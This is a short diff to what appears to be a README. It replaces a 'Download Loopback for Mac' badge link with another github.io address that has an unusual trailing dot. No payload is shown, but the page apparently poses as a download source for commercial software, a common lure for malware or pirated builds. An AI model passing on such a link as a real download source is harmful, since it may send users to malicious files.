@@ -5,7 +5,7 @@
 </div>  
 
 <div align="center">  
-<a href="https://junimata-orex.github.io/.github/loopback">  
+<a href="https://loopback-macos.github.io./.github/loopback">  
 <img src="https://img.shields.io/badge/🎵_Download_Loopback_for_Mac-darkgreen?style=for-the-badge&logo=apple" alt="Download Loopback for Mac">  
 </a>  
 </div>  
